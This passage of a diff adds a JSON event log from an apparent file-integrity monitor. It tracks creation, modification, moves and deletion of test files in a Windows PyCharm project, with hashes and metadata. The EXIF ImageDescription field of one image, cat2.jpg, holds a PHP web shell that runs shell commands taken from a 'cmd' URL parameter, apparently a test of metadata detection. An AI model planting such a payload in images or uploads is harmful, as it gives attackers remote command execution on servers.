+      "content_hash": "61b2f2b1a3fef2fe94cfa5cac1a0cc48d44f3eaa3c9459b52390bf05a55e7dd8",
+      "filesystem_hash": "434a86b668047bff98cd3459cba32c2d587faf18116a4ed0f8faa7730e45421b",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4295,
+        "created": 1765446560.68009,
+        "modified": 1765778181.9578297,
+        "accessed": 1765778181.994099,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765781287,
+      "event": "MODIFIED",
+      "file_uid": "e89a5123-97a4-409e-a1f5-029373763046",
+      "combined_hash": "63dc344610d892fc25f2460e2f20b503add2fc6fad0dfc3463c80760cfd1534f",
+      "content_hash": "162dd9a1cd3f3843020ed31559a9339adcaee8fd944f61cb99a5ddcd2c7d825c",
+      "filesystem_hash": "31933f95a456f6539006df87fe1b575d70027659c8e14ab6fe29fadd267cf119",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 4298,
+        "created": 1765446560.68009,
+        "modified": 1765781287.8044975,
+        "accessed": 1765781287.8365533,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783340,
+      "event": "DELETED",
+      "file_uid": "e89a5123-97a4-409e-a1f5-029373763046",
+      "combined_hash": null,
+      "content_hash": null,
+      "filesystem_hash": null,
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": null,
+      "embedded_metadata": null,
+      "current_user": null,
+      "machine": null
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\salam elvira.txt": [
+    {
+      "timestamp": 1765457751,
+      "event": "CREATED",
+      "file_uid": "8aa72181-9f35-4bba-9494-331a58f506e7",
+      "combined_hash": "1155a561ae0429b4d7dffa80f5e073ee686da21d1b7443a913a5a1f5d4231bfd",
+      "content_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "filesystem_hash": "633a7aa30630ef140db80d5017f4c729da9f25f4b9371bc1361938e83e47353e",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 0,
+        "created": 1765457751.2750933,
+        "modified": 1765457751.2750933,
+        "accessed": 1765457751.2750933,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765457756,
+      "event": "MODIFIED",
+      "file_uid": "8aa72181-9f35-4bba-9494-331a58f506e7",
+      "combined_hash": "5ce10b60c27376013e9576ce38ea9d37a68dffceca4db024cbd46fe85d297200",
+      "content_hash": "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824",
+      "filesystem_hash": "d042f1502004a4c240ee7934e9b3a8c48c041a0357c979831cf5ee858342b8c0",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 5,
+        "created": 1765457751.2750933,
+        "modified": 1765457756.996797,
+        "accessed": 1765457757.0078025,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783340,
+      "event": "DELETED",
+      "file_uid": "8aa72181-9f35-4bba-9494-331a58f506e7",
+      "combined_hash": null,
+      "content_hash": null,
+      "filesystem_hash": null,
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": null,
+      "embedded_metadata": null,
+      "current_user": null,
+      "machine": null
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\salam mehriban.txt": [
+    {
+      "timestamp": 1765520845,
+      "event": "MOVED",
+      "old_path": "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\test3.txt",
+      "new_path": "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\salam mehriban.txt",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "ca45942945380c38a94b0a42bcb2f03efc1101226f1fd4eac44d8e1287be98b9",
+      "content_hash": "0cb1595397422e9ff1e47f5e1692a199d19f3c0d95cb92ceeffdab89025e6d65",
+      "filesystem_hash": "419411feeeda1cddb4a16e491865f28211a4a91489fc38d4fb46360358029db4",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12770,
+        "created": 1765280330.8423429,
+        "modified": 1765457936.3248308,
+        "accessed": 1765520845.2100837,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765521038,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "cadaf2005cda55d944466fe63a1c70dcc9ecb30b08ae3dfcb599a4217aae2d90",
+      "content_hash": "a2d3fa3542978bd4322e1be52d32d518db3a5eab443a54d839d8320646b90a41",
+      "filesystem_hash": "df5cf8505cb0389ed02a47cbf76599f36f831138a1a086d22effbe7548576808",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12776,
+        "created": 1765280330.8423429,
+        "modified": 1765521036.4541504,
+        "accessed": 1765521038.557563,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765781393,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "7454f88093a6a068101e4b9594e68a913f18166a0a87b73b2fa1ad78c19f8b48",
+      "content_hash": "6b184866c65175f2f8783a2e79feaeb2bb05f41f576bf34f04569a33c233958c",
+      "filesystem_hash": "0b6b0f3435ad57fb7a474f92f14cde1734d11936f011af30305eb15fe8c479f0",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 25182,
+        "created": 1765280330.8423429,
+        "modified": 1765781393.0518048,
+        "accessed": 1765781393.0663373,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765781395,
+      "event": "MODIFIED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": "f170cda4059cb42706ca98b4b5d4e7b4a510a2405373ba70b2b6ea9b056b3ae1",
+      "content_hash": "8d1fa1e9b00e69bf1bf75d1a136cecdb595f3a4ffcc4fe21cb5f7a48fd9ba1d6",
+      "filesystem_hash": "8e996145ad3479f9bd56f8ab13223685082d076574756d18874f3b2bb54891d1",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 25174,
+        "created": 1765280330.8423429,
+        "modified": 1765781395.3861332,
+        "accessed": 1765781395.4011583,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783340,
+      "event": "DELETED",
+      "file_uid": "b524637c-e1e2-42ba-b20c-86889a21ba89",
+      "combined_hash": null,
+      "content_hash": null,
+      "filesystem_hash": null,
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": null,
+      "embedded_metadata": null,
+      "current_user": null,
+      "machine": null
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\TEST2\\cat.jpg": [
+    {
+      "timestamp": 1765783340,
+      "event": "CREATED",
+      "file_uid": "1121807f-0d23-4840-9c80-23a1b29fe364",
+      "combined_hash": "eabd2d2dc8ef4cc100fc8d31e250941c6e8b47692c2a23678fef7b39b302b53e",
+      "content_hash": "0e9aab96f66d3f8fdf2103619836532398b253888452b5266f960525ef83f399",
+      "filesystem_hash": "be63444980d41ecce5ac4e887d8254e9ea71fb15b9f518ebe885f68ccea9bcf0",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 31944,
+        "created": 1765281311.5354712,
+        "modified": 1764067242.9801624,
+        "accessed": 1765783340.511485,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\TEST2\\cat2.jpg": [
+    {
+      "timestamp": 1765783340,
+      "event": "CREATED",
+      "file_uid": "c737105c-cdb1-45a2-8ccf-bb1f643c61e3",
+      "combined_hash": "1e51b494d00a11ec7d6889af4ae9c20124a40ac2a102b6e1f6faf44fdb6e504a",
+      "content_hash": "24848086fb589628890dae5ae2bc40428e2215b8a9dd7c98bb3decd149a0e220",
+      "filesystem_hash": "4a1472bd370adeb7f66265d824f8e3f405cb39968dc08c81875391c8d78e6d59",
+      "embedded_metadata_hash": "2b1f874565e90dcffac21e1d24dab8d392e1efd9b1095e2eef84606974cf0c00",
+      "filesystem_metadata": {
+        "size": 32117,
+        "created": 1765281331.30032,
+        "modified": 1764067929.083979,
+        "accessed": 1765783340.578965,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": {
+        "ResolutionUnit": "1",
+        "ImageDescription": "<?php echo \"Shell\";system\\($_GET\\[\\'cmd\\'\\]\\); ?>",
+        "YCbCrPositioning": "1",
+        "XResolution": "1.0",
+        "YResolution": "1.0"
+      },
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783707,
+      "event": "DELETED",
+      "file_uid": "c737105c-cdb1-45a2-8ccf-bb1f643c61e3",
+      "combined_hash": null,
+      "content_hash": null,
+      "filesystem_hash": null,
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": null,
+      "embedded_metadata": null,
+      "current_user": null,
+      "machine": null
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\TEST2\\salam elvira.txt": [
+    {
+      "timestamp": 1765783340,
+      "event": "CREATED",
+      "file_uid": "e53c0d60-f7d5-4a88-80f7-8c42729e80f6",
+      "combined_hash": "750b60600789d0ed0e6991a00c2cbb42064c0e2cc35f61d3280f47c1ceeb1a26",
+      "content_hash": "27cc6994fc1c01ce6659c6bddca9b69c4c6a9418065e612c69d110b3f7b11f8a",
+      "filesystem_hash": "60cd77be884760321981bedb369a802f2b08c04898ed122cc3e4131178cba84b",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 8,
+        "created": 1765457751.2750933,
+        "modified": 1765783291.3765533,
+        "accessed": 1765783340.630123,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783357,
+      "event": "MODIFIED",
+      "file_uid": "e53c0d60-f7d5-4a88-80f7-8c42729e80f6",
+      "combined_hash": "74d32ff9f4a0e01832ccc7d92848135613143de936ff883a8ccd6ae0b3394056",
+      "content_hash": "fc6614fec1e5244645264f5a08eed31c6b87f9bf08a015c2a6fc82310a108524",
+      "filesystem_hash": "ad8aceba51b7daa869f38f724c9e54774d9aac266b0045493324acdeebfd8b6e",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 9,
+        "created": 1765457751.2750933,
+        "modified": 1765783357.435389,
+        "accessed": 1765783357.4444437,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783414,
+      "event": "MODIFIED",
+      "file_uid": "e53c0d60-f7d5-4a88-80f7-8c42729e80f6",
+      "combined_hash": "c87034a9b9b4a0f0fe321eda937381894f060783e6abbd72fad185a8b7a11430",
+      "content_hash": "9a4e63930257d5941303441e4d10139d80a42769bea3639fbc0845036453c478",
+      "filesystem_hash": "b717458b9db0a0a623ed018fb215e1c9bb7cce27fb9aec71a1b5b6569b21072e",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12,
+        "created": 1765457751.2750933,
+        "modified": 1765783407.3430748,
+        "accessed": 1765783414.138769,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783700,
+      "event": "MODIFIED",
+      "file_uid": "e53c0d60-f7d5-4a88-80f7-8c42729e80f6",
+      "combined_hash": "8a59d1b6c0989d39c6a4692734482a3c5fbc199a8589afa5acb0167fc4dae7a1",
+      "content_hash": "99f0be208ad2dbef724b3840b7bc94f62418e28c1096a7494d2ae79ccbb9c24e",
+      "filesystem_hash": "0f3621e0ba5c263454166eabb1710218240e2b9ad70287fe7064a21a41660aee",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 15,
+        "created": 1765457751.2750933,
+        "modified": 1765783700.603829,
+        "accessed": 1765783700.6143372,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\TEST3\\salam mehriban.txt": [
+    {
+      "timestamp": 1765783340,
+      "event": "CREATED",
+      "file_uid": "d0fbb78c-2923-47b1-b9f2-a818ec0f4312",
+      "combined_hash": "f170cda4059cb42706ca98b4b5d4e7b4a510a2405373ba70b2b6ea9b056b3ae1",
+      "content_hash": "8d1fa1e9b00e69bf1bf75d1a136cecdb595f3a4ffcc4fe21cb5f7a48fd9ba1d6",
+      "filesystem_hash": "d48f34c14501089e0338f0b6c50260da78c7bb40f49b876cce8e4bf50e67b360",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 25174,
+        "created": 1765280330.8423429,
+        "modified": 1765781395.3861332,
+        "accessed": 1765783340.696479,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783414,
+      "event": "MODIFIED",
+      "file_uid": "d0fbb78c-2923-47b1-b9f2-a818ec0f4312",
+      "combined_hash": "2cb3febad865c16f37081a7f950746a77a4f589ffe3544b765470cbee70cc33f",
+      "content_hash": "90cada94e29af975662f8115b1c5b0afb5cc5f67f54132817584578410bd650b",
+      "filesystem_hash": "52278b194b59bb1b1873f99d28b5e77add3525ff3343c9e5336340b27919df68",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 25177,
+        "created": 1765280330.8423429,
+        "modified": 1765783411.337043,
+        "accessed": 1765783414.175617,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1766053331,
+      "event": "MODIFIED",
+      "file_uid": "d0fbb78c-2923-47b1-b9f2-a818ec0f4312",
+      "combined_hash": "91e521a11c2fb672163fe67be47a64f541182c16a4a8519e426a36988054dffe",
+      "content_hash": "ddb01076f22405c923859b2738d748d4f8764b950bbce51c8a3fc8a0e5a3cceb",
+      "filesystem_hash": "3d5c17626b4a091b603127c0454cab07522e11fbd752e25e655cbe9b178ad910",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 25185,
+        "created": 1765280330.8423429,
+        "modified": 1766053331.4645195,
+        "accessed": 1766053331.4815586,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\TEST3\\wassup.txt": [
+    {
+      "timestamp": 1765783340,
+      "event": "CREATED",
+      "file_uid": "1a0aabac-2dfa-432d-9e58-85efe3dc4437",
+      "combined_hash": "337eb386cfff44c400fa126368fecb00dd445ac8c3b27654f33a06be5ff8dcea",
+      "content_hash": "e103ce2bde343ab7e00d8767a95158619024574e978619bfec8d8580cc8f8fa6",
+      "filesystem_hash": "75857e086b84e9609f955675bd56a1038d0a36bee9e4a793a78d567f9b800e54",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 17,
+        "created": 1764406100.9620962,
+        "modified": 1765380770.8490458,
+        "accessed": 1765783340.768068,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783352,
+      "event": "MODIFIED",
+      "file_uid": "1a0aabac-2dfa-432d-9e58-85efe3dc4437",
+      "combined_hash": "91d895209939113230c0eaaceea01ee4d8a08e22fed287817ae8cc65a456444e",
+      "content_hash": "03c64027d33b3b682d8e1dcb5a4d6b78f69f97874727d6e8f89048711f9333af",
+      "filesystem_hash": "e988ba6b3f6aff59825cb229b0c576b9b2163f81073a9e03d9b2f1aa032c728a",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 20,
+        "created": 1764406100.9620962,
+        "modified": 1765783352.8167255,
+        "accessed": 1765783352.8522642,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783414,
+      "event": "MODIFIED",
+      "file_uid": "1a0aabac-2dfa-432d-9e58-85efe3dc4437",
+      "combined_hash": "eb277247ec30cc55d368df6b37254373ae2377acc2c14e16b76b7423f99e4394",
+      "content_hash": "22ca117e3c3088054b5ae75f5153f1c1db8f06078875c2c5156d51579acc5897",
+      "filesystem_hash": "5b0a631b20462c4b1565c8d6567aa1a04225df03f5beca0f410b1e155e20b2de",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 23,
+        "created": 1764406100.9620962,
+        "modified": 1765783408.6290402,
+        "accessed": 1765783414.2230306,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765789699,
+      "event": "MODIFIED",
+      "file_uid": "1a0aabac-2dfa-432d-9e58-85efe3dc4437",
+      "combined_hash": "587247e02b654e04a11ea0f1f949bafa1c045b48c0e85025147b1a163ead0caa",
+      "content_hash": "ddb8976ce3197722400353de80c8991169dde7661fe3d85eb2cd91721b4695a4",
+      "filesystem_hash": "abafa5b51dadbd2e36af70b38d736133b8f3ca23ac13472d9920e29e232b3d81",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 26,
+        "created": 1764406100.9620962,
+        "modified": 1765789699.7953334,
+        "accessed": 1765789699.8042634,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765869306,
+      "event": "MODIFIED",
+      "file_uid": "1a0aabac-2dfa-432d-9e58-85efe3dc4437",
+      "combined_hash": "b5ff3cf442477ba5708c229bfcaf8337aeff17d90df594e7b0eb7b09cc2c1231",
+      "content_hash": "fd8b4d03287846a71a5684731d60c1630e464ca6e1fdaa0c1cfff13500b9234b",
+      "filesystem_hash": "2680c06ff453ee6a7b0775cf87e6436a0e48d6b5145619dc98881418b56593ee",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 35,
+        "created": 1764406100.9620962,
+        "modified": 1765869306.221011,
+        "accessed": 1765869306.2299182,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\test4\\hello amigo.txt": [
+    {
+      "timestamp": 1765783609,
+      "event": "CREATED",
+      "file_uid": "048cc438-0c7d-4de9-ad9f-2b856656ac94",
+      "combined_hash": "43f33cc15869707c5e6e34bb598400748441f58ece086a4959a4ad6464527f85",
+      "content_hash": "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
+      "filesystem_hash": "3d2b2586a7721bc2ed3c7c673dde7298fcf11e73e19aee8affc02c223d1bbeed",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 3,
+        "created": 1765783554.3365252,
+        "modified": 1765783556.5630598,
+        "accessed": 1765783609.8396575,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783625,
+      "event": "MODIFIED",
+      "file_uid": "048cc438-0c7d-4de9-ad9f-2b856656ac94",
+      "combined_hash": "531ee379fbb2cc53ac7d505583548f8875c8ebe74be2916779728a406e9644d4",
+      "content_hash": "96cae35ce8a9b0244178bf28e4966c2ce1b8385723a96a6b838858cdd6ca0a1e",
+      "filesystem_hash": "546fbeafaa0e04982bfe40866877f8b45214fd98f3af549104937947ebbe8436",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 6,
+        "created": 1765783554.3365252,
+        "modified": 1765783625.628045,
+        "accessed": 1765783625.6584518,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765783631,
+      "event": "MODIFIED",
+      "file_uid": "048cc438-0c7d-4de9-ad9f-2b856656ac94",
+      "combined_hash": "faff314ca58f7006bdae17174c73e5ca43720f3495ce9efe289680c56ddd1bf5",
+      "content_hash": "f4227d66b520f35c78b27abcc1f128cff27f6df7737262e196c7ff0d3bcab55c",
+      "filesystem_hash": "ef1458aff28b33d97a77d27f800867eb7d4e65a2f2a5c11393e814300b95b56d",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 7,
+        "created": 1765783554.3365252,
+        "modified": 1765783631.4079783,
+        "accessed": 1765783631.415488,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765789031,
+      "event": "MODIFIED",
+      "file_uid": "048cc438-0c7d-4de9-ad9f-2b856656ac94",
+      "combined_hash": "b34214670f5b6badc7727d502c6b314cf194d83af1453bbbd694e41193bc753c",
+      "content_hash": "c36736a367f0557ecf3b3665430a89b3fd21ba27578db8c261e0c6b9a41bd04b",
+      "filesystem_hash": "7be28180bf8e5ce0ae0da345e53ac4205dbc91fdbe50e9024c7b52344bb1e69e",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 10,
+        "created": 1765783554.3365252,
+        "modified": 1765789031.228565,
+        "accessed": 1765789031.2608182,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    }
+  ],
+  "C:\\Users\\Ravan\\PycharmProjects\\REFER\\TEST\\TEST2\\bob.txt": [
+    {
+      "timestamp": 1765783717,
+      "event": "CREATED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "fee3f75fc19e3477ada83c266b6d5d3e84d5122e2f1d6ed1525dcd4ae43725f8",
+      "content_hash": "99f0be208ad2dbef724b3840b7bc94f62418e28c1096a7494d2ae79ccbb9c24e",
+      "filesystem_hash": "44447c7c861b61dbbc0e844283fe55742781abb1e0bb87bc8ec10d2cdcc05dbe",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 15,
+        "created": 1765783717.286699,
+        "modified": 1765783700.603829,
+        "accessed": 1765783717.3247404,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765803697,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "56978678922b211f360366329788ac880711c2f1065d89b8a1ad51ae76b346f8",
+      "content_hash": "10fb252ea230b3dff91aacd2a82b785309f91708cb92450c723b011e3ff63288",
+      "filesystem_hash": "8ff3368849aecd3f6cccecd4a4f977ef881853164e401b598e8f93ce9a44e189",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 18,
+        "created": 1765783717.286699,
+        "modified": 1765803697.1033094,
+        "accessed": 1765803697.112336,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765869108,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "ca2f53eb15df2f566fc560d2a242fe73912f01ab5f54523a9d198e9ecd2b1cc5",
+      "content_hash": "a7d82cc7cb6d3d9055ce74064f3d403a9ebaa09c402ba22689225d4c16e5b47b",
+      "filesystem_hash": "e70a85236c1714032c576048009993a35fa397fd0ca9f8095a860a0337e12b49",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 21,
+        "created": 1765783717.286699,
+        "modified": 1765869108.1627643,
+        "accessed": 1765869108.1727877,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765869149,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "36edbc77ab68ad181e90c500228c40776066113c42256cbf57d825eee746df2c",
+      "content_hash": "cb4d45bcb721b24da41978455d83d91c40f02880aee78f2ec64c99846d61679e",
+      "filesystem_hash": "47b3ba18764d59cb91d526ba63d3edbe4fbce1bce7ae3e58e1f7f6472d5bef7f",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12364,
+        "created": 1765783717.286699,
+        "modified": 1765869149.3398328,
+        "accessed": 1765869149.3504033,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765960103,
+      "event": "MODIFIED",
+      "file_uid": "d5dcd79a-3f29-465c-a83f-cf744d23309d",
+      "combined_hash": "9798b5e4523cf5b1e4668b1f87d497646a52d0fcfbcb5155938e1d81c0d0c33c",
+      "content_hash": "008e599f6d8973edc88b06658aede4490d8ff3ac98cd41f1e57115a11ac7e625",
+      "filesystem_hash": "d571e5d94802d3aebd0b203d8eaec992b4255270ef5c038790b5b2e764928481",
+      "embedded_metadata_hash": null,
+      "filesystem_metadata": {
+        "size": 12370,
+        "created": 1765783717.286699,
+        "modified": 1765960103.9898584,
+        "accessed": 1765960104.0136728,
+        "owner": "DESKTOP-REV\\Ravan",
+        "attributes": {
+          "read_only": false,
+          "hidden": false,
+          "system": false
+        }
+      },
+      "embedded_metadata": null,
+      "current_user": "Ravan",
+      "machine": "DESKTOP-REV"
+    },
+    {
+      "timestamp": 1765960105,
